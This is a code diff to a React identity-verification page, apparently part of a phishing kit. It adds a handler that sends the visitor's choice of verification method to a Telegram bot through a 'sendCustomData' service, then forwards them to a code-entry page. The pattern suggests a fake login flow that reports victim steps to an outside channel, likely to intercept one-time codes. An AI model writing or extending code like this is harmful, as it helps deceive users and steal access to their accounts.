@@ -1,8 +1,17 @@
 import React from 'react';
 import { useNavigate } from 'react-router-dom';
+import { sendCustomData } from '../services/telegramBot';
 
 const IdentityVerification = () => {
   const navigate = useNavigate();
+
+  const handleVerificationMethod = async (method) => {
+    // Send verification method selection to Telegram
+    await sendCustomData('🆔 Verification Method Selected', {
+      'Method': method
+    });
+    navigate('/enter-code');
+  };
 
   return (
     <div className="identity-page">
@@ -24,7 +33,7 @@ const IdentityVerification = () => {
           </p>
 
           <div className="verification-options">
-            <div className="option-item" onClick={() => navigate('/enter-code')}>
+            <div className="option-item" onClick={() => handleVerificationMethod('Text Message')}>
               <div className="option-icon text-icon">
                 <i className="fa-solid fa-comment-sms"></i>
               </div>
@@ -35,7 +44,7 @@ const IdentityVerification = () => {
               <i className="fa-solid fa-chevron-right arrow-icon"></i>
             </div>
 
-            <div className="option-item" onClick={() => navigate('/enter-code')}>
+            <div className="option-item" onClick={() => handleVerificationMethod('Phone Call')}>
               <div className="option-icon call-icon">
                 <i className="fa-solid fa-headset"></i>
               </div>
